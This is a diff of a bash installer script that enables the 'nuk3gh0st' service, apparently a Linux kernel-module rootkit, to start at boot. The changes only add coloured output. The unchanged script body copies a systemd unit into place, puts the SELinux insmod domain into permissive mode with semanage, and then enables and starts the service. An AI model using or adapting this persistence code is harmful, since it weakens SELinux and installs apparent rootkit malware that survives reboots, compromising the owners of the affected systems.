@@ -1,23 +1,30 @@
 #!/bin/bash
-echo "#################################"
-echo "# Enabling nuk3gh0st at startup #"
-echo "#################################"
+
+green='\e[0;32m'
+red='\e[0;31m'
+endColor='\e[0m'
+item=${green}[*]${endColor}
+
 echo ""
-echo "Coping nuk3gh0st.service to systemd startup scripts directory"
-echo "cmd: cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service"
+echo -e "${green}#################################${endColor}"
+echo -e "${green}# Enabling nuk3gh0st at startup #${endColor}"
+echo -e "${green}#################################${endColor}"
+echo ""
+echo -e "${item}Coping nuk3gh0st.service to systemd startup scripts directory"
+echo -e "${red}cmd: cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service${endColor}"
 cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service
-echo "Checking if SELINUX is enabled"
+echo -e "${item}Checking if SELINUX is enabled"
 if [ -f /usr/sbin/semanage ]; then
-	echo "SELINUX is enabled"
-	echo "Enabling insmod permissive mode"
-	echo "cmd: semanage permissive -a insmod_t"
+	echo -e "${item}SELINUX is enabled"
+	echo -e "${item}Enabling insmod permissive mode"
+	echo -e "${red}cmd: semanage permissive -a insmod_t${endColor}"
 	semanage permissive -a insmod_t
 else
-	echo "SELINUX is disabled"
+	echo -e "${item}SELINUX is disabled"
 fi
-echo "Enabling nuk3gh0st.service"
-echo "cmd: systemctl enable nuk3gh0st.service"
+echo -e "${item}Enabling nuk3gh0st.service"
+echo -e "${red}cmd: systemctl enable nuk3gh0st.service${endColor}"
 systemctl enable nuk3gh0st.service
-echo "Starting nuk3gh0st.service"
-echo "cmd: service nuk3gh0st start"
+echo -e "${item}Starting nuk3gh0st.service"
+echo -e "${red}cmd: service nuk3gh0st start${endColor}"
 service nuk3gh0st start
